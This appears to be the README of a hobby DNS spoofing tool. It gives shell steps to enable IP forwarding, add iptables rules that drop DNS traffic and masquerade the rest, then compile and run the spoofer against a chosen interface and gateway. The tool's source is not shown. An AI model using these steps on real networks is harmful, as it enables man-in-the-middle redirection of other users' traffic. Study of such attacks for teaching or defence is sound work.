# DNS Spoofer

## How to run

### 1. Enable ip forwarding

```sh
echo "1" > /proc/sys/net/ipv4/ip_forward
```

### 2. Add routing via iptables

This will make it so that all the incoming packages are passed to the router except for DNS requests.

```sh
sudo iptables -t mangle -I PREROUTING -p udp --dport 53 -j DROP
sudo iptables -t nat -A POSTROUTING -o wlo1 -j MASQUERADE
```

### 3. Compile

```sh
make
```

### 4. Run

```sh
sudo ./dns_spoofer INTERFACE_NAME GATEWAY_IP_ADDR
```

If you are not sure which interface to use, run "ip a" and look for the one that has "state UP"

#### Example:

If your interface is wlo1 and your gateway is 192.168.0.1 then you can run the following command:

```sh
sudo ./dns_spoofer wlo1 192.168.0.1
```
